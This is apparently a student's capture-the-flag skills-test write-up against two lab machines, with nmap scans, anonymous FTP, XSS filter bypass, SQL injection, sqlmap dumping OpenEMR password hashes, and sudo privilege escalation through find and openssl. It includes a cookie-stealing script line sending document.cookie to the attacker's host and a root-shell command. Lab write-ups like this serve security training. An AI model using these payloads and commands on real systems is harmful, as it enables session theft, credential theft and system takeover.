---
title: "SkillsTest V1"
date: 2021-08-04T15:18:59+01:00
---

# 245 Skills test - Notes

## System 1

- Target IP Address: 192.168.118.130
- Open ports: 
  - 21 FTP (Anon allowed)
  - 22 SSH
  - 25 SMPT
  - 80 HTTP (Werkzeug httpd 1.0.1)+(Python 3.9.0)
  - 4444 krb254? (FourOhFourRequest) - Still gives 200 ok?
  - 8080 HTTP (Apache/2.4.38 Debian)
  - 1 service unrecognised (Linux kernel | HTTP requests)

<details>
<summary>Click here for: "Nmap -A" scan</summary>
<br>

~~~term
┌──(user㉿kali)-[~]
└─$ nmap -A 192.168.118.130
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 12:19 GMT
Nmap scan report for 192.168.118.130
Host is up (0.0016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Pure-FTPd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 127.0.0.1 is not the same as 192.168.118.130
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f5:f2:1d:64:04:1b:fd:92:22:7e:6b:71:b7:f4:72:49 (RSA)
|   256 4b:80:f8:74:c0:8d:aa:40:fc:38:02:16:9f:1c:3b:bd (ECDSA)
|_  256 a8:08:e5:35:12:d6:a4:cc:74:8f:4c:9c:02:62:f4:f1 (ED25519)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: de3ca8149527.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=de3ca8149527
| Subject Alternative Name: DNS:de3ca8149527
| Not valid before: 2021-03-24T13:51:20
|_Not valid after:  2031-03-22T13:51:20
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Werkzeug httpd 1.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/1.0.1 Python/3.9.0
| http-title: Skills Test 2021
|_Requested resource was http://192.168.118.130/setup
4444/tcp open  krb524?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 27 Mar 2021 12:19:43 GMT
|     Content-Length: 30
|     Content-Type: text/plain; charset=utf-8
|     using Selenoid 1.10.0!
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 27 Mar 2021 12:19:18 GMT
|     Content-Length: 30
|     Content-Type: text/plain; charset=utf-8
|_    using Selenoid 1.10.0!
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Skills Test 2021
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.91%I=7%D=3/27%Time=605F22C6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,93,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\x20Mar\x2020
SF:21\x2012:19:18\x20GMT\r\nContent-Length:\x2030\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\n\r\nYou\x20are\x20using\x20Selenoid\x201\.1
SF:0\.0!")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLv23SessionReq,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Generic
SF:Lines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(HTTPOptions,93,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2027\
SF:x20Mar\x202021\x2012:19:18\x20GMT\r\nContent-Length:\x2030\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\n\r\nYou\x20are\x20using\x20Sele
SF:noid\x201\.10\.0!")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ke
SF:rberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(FourOhFourRequest,93,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,
SF:\x2027\x20Mar\x202021\x2012:19:43\x20GMT\r\nContent-Length:\x2030\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nYou\x20are\x20using\
SF:x20Selenoid\x201\.10\.0!")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host:  de3ca8149527.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.50 seconds
                                                                
~~~
</details>
</br>
> - Gather foothold intellegence in each of these potential attack vectors.

---

### Port 21 FTP:

The previous Nmap scan incidicated that the FTP service was running on port 21. It also stated that anonymous login is permitted.

<details>
<summary>Click here for: "ftp" connection commands</summary>
<br>

~~~term
┌──(user㉿kali)-[~]
└─$ ftp 192.168.118.130:80
ftp: 192.168.118.130:80: Name or service not known
ftp> exit
                                                                                        
┌──(user㉿kali)-[~]
└─$ ftp 192.168.118.130   
Connected to 192.168.118.130.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 30 allowed.
220-Local time is now 12:28. Server port: 21.
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (192.168.118.130:user): anonymous
230 Anonymous user logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Connecting to port 45339
-rw-r--r--    1 0          0                  40 Mar 24 13:48 FTPFlag.txt
226-Options: -l 
226 1 matches total
ftp> get FTPFlag.txt 
local: FTPFlag.txt remote: FTPFlag.txt
200 PORT command successful
150 Connecting to port 52727
226-File successfully transferred
226 0.016 seconds (measured here), 2.45 Kbytes per second
40 bytes received in 0.02 secs (2.3890 kB/s)
ftp> exit
221-Goodbye. You uploaded 0 and downloaded 1 kbytes.
221 Logout.
                                                                                   
┌──(user㉿kali)-[~]
└─$ ls
 FTPFlag.txt    Pictures     Music            Downloads 
 Desktop        hash.txt     Public           Templates
 Documents      hi.docm      __pycache__      Videos
                                                                                                    
┌──(user㉿kali)-[~]
└─$ cat FTPFlag.txt 
The Flag is CUEH:{anonymous_ftp_access}
~~~
</details> 

<br>
> By logging in anonymously and listed the directory contents, we found the flag. Using a GET request, we exported it to our own system.

---
### Port 80

We can navigate to the web service being hosted on the system through the browser. We are presented with challenges

![IP:80/setup sceenshot](https://i.imgur.com/FRbjGdX.png)

- We are presented with a multitude of challenges.
- Lets begin:

#### Website enumeration

So we need to find a flag in a hidden page on the web-server, for this we can use directory bruteforcing.

![dirb bruteforce](https://i.imgur.com/Kgdtu9A.png)

- We scan using dirb by supplying the url then wordlist.
- Next step is to look inside any interesting directories

![secrets](https://i.imgur.com/tZvubLo.png)

- This search came up with nothing, however at the moment we are only looking for files. We need to add the .html extension to look for webpages

![-X .HTML](https://i.imgur.com/qNJIMqB.png)

- We find the flag page, move to it, and finish with the flag.


#### Reflected XSS

![Ref_XSS page](https://i.imgur.com/0BZdbXs.png)

- Lets begin by inserting the correct response

![R-XSS_CorrectInput](https://i.imgur.com/Vcjqixq.png)

- Next step again is to try a generic injection. For XSS I am using '"<"script">"alert('XSS')"<"/script">"' (Rm double quotes)

![R-XSS_InitialInjeciton](https://i.imgur.com/bYstJue.png)

- We can tell from the output that the initial 'script' word in the first tag is removed
- The entire seond tab has also been filtered out, with the tag boundaries also. (?Unintended?)

![TrialInjection1](https://i.imgur.com/3qqdfb6.png)

- Here we see that it is looking for the regex 'script' and removing it.
- Lets try splitting the word and sending that.

![TrialInjection2XSS](https://i.imgur.com/r8qaejb.png)

> This works and gives us a popup:

![R-XSS_InjectPopup](https://i.imgur.com/I6tJC6A.png)

> Upon exiting the popup, we are registered and the flag is presented.

![R-XSS Flag](https://i.imgur.com/N5uObiL.png)

---

#### SQL Bypass

![SQL_Bypass page]()

- We can begin by inserting a correct response to the form.

![CorrectInput](https://i.imgur.com/whIefKq.png)

> - We see that it outputs that no such user or pass exist

- Now it is time to try injection

![InitialInject](https://i.imgur.com/VxnSpGb.png)

> - Here we see that the field requires type 'email'

![EmailZoomedIn](https://i.imgur.com/RQhcqNy.png)

> - We can bypass this locally by accessing the inpsector tab and changing the field requirement.

![Type=text](https://i.imgur.com/PQQdrYs.png)

> - This redirects us to an error page, indicating that we are on the right tracks.
> - Now is time to break some logic (Assume from here that the type is always text) 

![InitialLogicBreak](https://i.imgur.com/mahR2wT.png)

> - The error that it cannot process that many users tells us that the query is trying to bring back the whole table.
> - Lets try to limit the results

![LIMITResults](https://i.imgur.com/qHOxIMQ.png)

> - This is successful, and we can not begin to move around the table using offset.

![FLAGResult](https://i.imgur.com/arUqfBg.png)

> Voila, we have the flag.

---

#### Privelege Escalation

> For this challenge, we have been provided with details privesc:privesc for SSH.


~~~term
┌──(user㉿kali)-[~/Desktop/Event/Build-a-CTF_Event]
└─$ ssh privesc@192.168.118.130
privesc@192.168.118.130's password: 
Linux 8dd4379b5499 5.4.82-0-virt #1-Alpine SMP Thu, 10 Dec 2020 08:58:01 UTC x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 28 18:54:42 2021 from 192.168.118.142
privesc@8dd4379b5499:~$ whoami
privesc
privesc@8dd4379b5499:~$ sudo -l
[sudo] password for privesc: 
Matching Defaults entries for privesc on 8dd4379b5499:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User privesc may run the following commands on 8dd4379b5499:
    (ALL : ALL) /usr/bin/find
privesc@8dd4379b5499:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# cd ..
# ls
privesc
# cd ..
# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
# cd root
# ls
root.txt
# cat root.txt
245_SKILLS{Acc3s_All_Ar3@s}
# 
~~~

https://gtfobins.github.io/gtfobins/find/

#### SQL Enum

We are given the landing page for the enumeration.

![SQL Enum page](https://i.imgur.com/rNKYJqT.png)

- The first thing we can do is make sure it is bringing back all information
- Using OR 1=1;# will bring everything out. By using this along with order by to test which columns relate to which numbers.
- The command to use is <'or 1=1 order by 2;#> for this example, from using order by 1 nothing changed, therefore it must be some form of Unique ID that is not much use.
- Order by 2 gives us the first bit of what we need.

![OrderBy2](https://i.imgur.com/cHUtZle.png)

- Once we iterate through all the columns, we come to find that the only available ones are 1,2,3,4. 

> ID (1) | Product Name (2) | Description (3) | Cost (4)

- Another way of doing this is using a UNION SELECT statement, however you need to know the amount of columns

![UnionSelect1234](https://i.imgur.com/ycyg4hb.png)

> Now that we know that we can get information in the correct format we can begin to include other data that wouldnt otherwise be there
> - A good place to start looking is in information_schema.tables

![InformationSchemaCommand](https://i.imgur.com/ZvpqcOA.png)

- Then if we move to the bottom, there is some hiddenTable

![hiddenTableresult](https://i.imgur.com/0WQfabg.png)

- We can look in this table for keyword 'flag' to see if anythign is returned. To do this, we just include it in one of the columns.

![flagsqlenum](https://i.imgur.com/dRn8mst.png)

---

#### Stored XSS
new Image().src="http://192.168.118.142:8000/evil.php?output="+document.cookie

To begin this we are given a page where we can post a message to be stored somewhere.

![StoredXSSstartpage](https://i.imgur.com/mroEfXD.png)

- We can post to this page by submitting with text in the box

![MessageSubmit](https://i.imgur.com/XQPwqN7.png)

- Now its time to see if we can get popups to work. (Earlier on this machine I set a cookie up, originally nothing was displayed, it was just used for debugging)

![popup](https://i.imgur.com/qQsoGy2.png)

- Time to spin up a python server to take the redirects we will set up

![PythonServer](https://i.imgur.com/9iGjGSY.png)

- When we try to use an image source to redirect the cookie to, we see that the server doesn't pick this up. We need to use 'new' to be able to read the cookie.

![SessionToken](https://i.imgur.com/AdVB92b.png)

- Now we have the session token, we can become that user.

----
#### File Includes

##### Directory Traversal

For this task we are given a set of options that when selected and run allow us to input some traversal commands in the URL.

After putting many in and discovering that traversal was possible, it was just a case of putting the file name:

![DirTrav](https://i.imgur.com/nHslM7S.png)

----
# Machine 2

245ST2_Notes.md

IP ADDRESS: 192.168.119.132

NMap Scan:

~~~term
┌──(user㉿kali)-[~]
└─$ nmap -sVC -T4 -p- 192.168.118.132
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 13:06 BST
Nmap scan report for 192.168.118.132
Host is up (0.00031s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f5:f2:1d:64:04:1b:fd:92:22:7e:6b:71:b7:f4:72:49 (RSA)
|   256 4b:80:f8:74:c0:8d:aa:40:fc:38:02:16:9f:1c:3b:bd (ECDSA)
|_  256 a8:08:e5:35:12:d6:a4:cc:74:8f:4c:9c:02:62:f4:f1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: OpenEMR Login
|_Requested resource was interface/login/login.php?site=default
3306/tcp open  mysql   MySQL 5.7.25
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.25
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, IgnoreSpaceBeforeParenthesis, LongPassword, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, InteractiveClient, SupportsCompression, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 1\x0C/HN8u\x0E\x0C\\x103\~5\x19\x0Ev\x1Fh
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
4222/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:96:4b:ed:b8:06:53:1d:74:bb:96:89:8a:36:76:27 (RSA)
|   256 32:91:7b:a3:a1:4d:7a:26:f8:e6:75:6c:4d:58:7d:08 (ECDSA)
|_  256 5e:ce:ed:03:9d:d5:af:94:40:80:fb:59:04:7a:dd:12 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds
~~~

#### Port 80

> The index for the webservice on port 80 shows us an OPENEMR Page.

![LoginPage](https://i.imgur.com/Ft2rTQk.png)

When directory bruteforcing (Ensure that use PHP and HTML extensions to find out more information.)

> Gobuster on the site

~~~term
┌──(user㉿kali)-[~]
└─$ gobuster dir -u http://192.168.118.132 -w /usr/share/wordlists/dirb/common.txt -x php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
2021/04/23 12:59:44 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htpasswd.html       (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.hta.php             (Status: 403) [Size: 280]
/.hta.html            (Status: 403) [Size: 280]
/admin.php            (Status: 200) [Size: 937]
/admin.php            (Status: 200) [Size: 937]
/common               (Status: 301) [Size: 319] [--> http://192.168.118.132/common/]
/config               (Status: 301) [Size: 319] [--> http://192.168.118.132/config/]
/contrib              (Status: 301) [Size: 320] [--> http://192.168.118.132/contrib/]
/controller.php       (Status: 200) [Size: 37]                                       
/controllers          (Status: 301) [Size: 324] [--> http://192.168.118.132/controllers/]
/custom               (Status: 301) [Size: 319] [--> http://192.168.118.132/custom/]     
/images               (Status: 301) [Size: 319] [--> http://192.168.118.132/images/]     
/index.php            (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
/index.php            (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
/interface            (Status: 301) [Size: 322] [--> http://192.168.118.132/interface/]   
/library              (Status: 301) [Size: 320] [--> http://192.168.118.132/library/]     
/LICENSE              (Status: 200) [Size: 35147]                                         
/modules              (Status: 301) [Size: 320] [--> http://192.168.118.132/modules/]     
/portal               (Status: 301) [Size: 319] [--> http://192.168.118.132/portal/]      
/public               (Status: 301) [Size: 319] [--> http://192.168.118.132/public/]      
/server-status        (Status: 403) [Size: 280]                                           
/services             (Status: 301) [Size: 321] [--> http://192.168.118.132/services/]    
/sites                (Status: 301) [Size: 318] [--> http://192.168.118.132/sites/]       
/setup.php            (Status: 200) [Size: 1214]                                          
/sql                  (Status: 301) [Size: 316] [--> http://192.168.118.132/sql/]         
/templates            (Status: 301) [Size: 322] [--> http://192.168.118.132/templates/]   
/tests                (Status: 301) [Size: 318] [--> http://192.168.118.132/tests/]       
/vendor               (Status: 301) [Size: 319] [--> http://192.168.118.132/vendor/]      
/version.php          (Status: 200) [Size: 0]                                             
                                                                                          
===============================================================
2021/04/23 12:59:48 Finished
===============================================================
                                                    
~~~

I navigate to the admin page and get given the version of openEMR. Time to look up the Real World writeup.


![OpenEMR Vuln page](https://i.imgur.com/oKLIY1P.png)

~~~term
                                                                                                                                                                                                                                            
┌──(user㉿kali)-[~]
└─$ sqlmap -r openemr.req --threads=10 -D openemr --tables                                                                                                                                                                              1 ⨯
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.5.4#stable}                                                                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:07:58 /2021-04-23/

[13:07:58] [INFO] parsing HTTP request from 'openemr.req'
[13:07:58] [INFO] resuming back-end DBMS 'mysql' 
[13:07:58] [INFO] testing connection to the target URL
[13:07:58] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (6722=6722) THEN 1 ELSE (SELECT 8202 UNION SELECT 8377) END))

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x71626a6a71,(SELECT (ELT(4791=4791,1))),0x7162627171),4791)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 4310 FROM (SELECT(SLEEP(5)))nHfp)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71626a6a71,0x685273536564596f59706b79575448676665704a484f696d6c52744b6b6a46437a68687751595054,0x7162627171),NULL-- -
---
[13:07:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.2.34
back-end DBMS: MySQL >= 5.6
[13:07:58] [INFO] fetching tables for database: 'openemr'
Database: openemr
[234 tables]
+---------------------------------------+
| array                                 |
| groups                                |
| log                                   |
| version                               |
| addresses                             |
| amc_misc_data                         |
| amendments                            |
| amendments_history                    |
| ar_activity                           |
| ar_session                            |
| audit_details                         |
| audit_master                          |
| automatic_notification                |
| background_services                   |
| batchcom                              |
|.                                      |
|.                                      |
|.#SHORTENED FOR EASE OF REPORT         |
| transactions                          |
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| voids                                 |
| x12_partners                          |
+---------------------------------------+

[13:07:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/192.168.118.132'

[*] ending @ 13:07:58 /2021-04-23/
~~~

> Here we can see the users_secure table, which from the report we know to look into.

~~~TERM
┌──(user㉿kali)-[~]
└─$ sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.5.4#stable}                                                                                                                                                                                                    
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:10:32 /2021-04-23/

[13:10:32] [INFO] parsing HTTP request from 'openemr.req'
[13:10:32] [INFO] resuming back-end DBMS 'mysql' 
[13:10:32] [INFO] testing connection to the target URL
[13:10:32] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (6722=6722) THEN 1 ELSE (SELECT 8202 UNION SELECT 8377) END))

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x71626a6a71,(SELECT (ELT(4791=4791,1))),0x7162627171),4791)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 4310 FROM (SELECT(SLEEP(5)))nHfp)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71626a6a71,0x685273536564596f59706b79575448676665704a484f696d6c52744b6b6a46437a68687751595054,0x7162627171),NULL-- -
---
[13:10:32] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.2.34
back-end DBMS: MySQL >= 5.6
[13:10:32] [INFO] fetching columns for table 'users_secure' in database 'openemr'
[13:10:32] [INFO] fetching entries for table 'users_secure' in database 'openemr'
Database: openemr
Table: users_secure
[2 entries]
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
| id | salt    | password                                                     | username | last_update         | salt_history1 | salt_history2 | password_history1              | password_history2 |
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
| 1  | <blank> | $2a$05$0ZgJ/ckahD2RWsg3iN7b2uyt0p4ytBBQuJqMUduF.hH5K7TRhLNnW | <blank>  | 2021-03-28 21:46:23 | <blank>       | <blank>       | $2a$05$0ZgJ/ckahD2RWsg3iN7b2v$ | admin             |
| 4  | <blank> | $2a$05$uR2GSLF46MDxo.vHKyapAOxNAVhDyzUm3AxXNcTCPH3WYdrNwjUT. | <blank>  | 2021-03-26 22:35:10 | <blank>       | <blank>       | $2a$05$uR2GSLF46MDxo.vHKyapAS$ | sysadmin          |
+----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+

[13:10:32] [INFO] table 'openemr.users_secure' dumped to CSV file '/home/user/.local/share/sqlmap/output/192.168.118.132/dump/openemr/users_secure.csv'
[13:10:32] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/192.168.118.132'

[*] ending @ 13:10:32 /2021-04-23/

~~~

> We can crack the hash and ssh to the server

~~~term
┌──(user㉿kali)-[~]
└─$ ssh sysadmin@192.168.118.132                                                                                                                                                                                                      255 ⨯
The authenticity of host '192.168.118.132 (192.168.118.132)' can't be established.
ECDSA key fingerprint is SHA256:ZRkVNFCQPSUG1pbyc7qQXrxEY0uaOJ9FnfmpJ9Egjz0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.132' (ECDSA) to the list of known hosts.
sysadmin@192.168.118.132's password: 
Linux 93e4ad68c07c 5.4.82-0-virt #1-Alpine SMP Thu, 10 Dec 2020 08:58:01 UTC x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sysadmin@93e4ad68c07c:~$ ls
user.txt
sysadmin@93e4ad68c07c:~$ cat user.txt
245_SKILLS{R3al_W0rld_Wr1teup}
~~~


> In order to get the root flag it was improtatnt to use sudo -l.

~~~term
sysadmin@93e4ad68c07c:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for sysadmin: 
Matching Defaults entries for sysadmin on 93e4ad68c07c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sysadmin may run the following commands on 93e4ad68c07c:
    (ALL : ALL) /usr/bin/openssl
~~~

> Then going to GTFO bins we can find the method to read files using sudo with openssl

~~~term
sysadmin@93e4ad68c07c:~$ openssl enc -in "/root/root.txt"
Can't open /root/root.txt for reading, Permission denied
140438538339456:error:0200100D:system library:fopen:Permission denied:../crypto/bio/bss_file.c:69:fopen('/root/root.txt','rb')
140438538339456:error:2006D002:BIO routines:BIO_new_file:system lib:../crypto/bio/bss_file.c:78:
sysadmin@93e4ad68c07c:~$ sudo openssl enc -in "/root/root.txt"
245_SKILLS{Acc3s_All_Ar3@s}
~~~

Got the root flag.
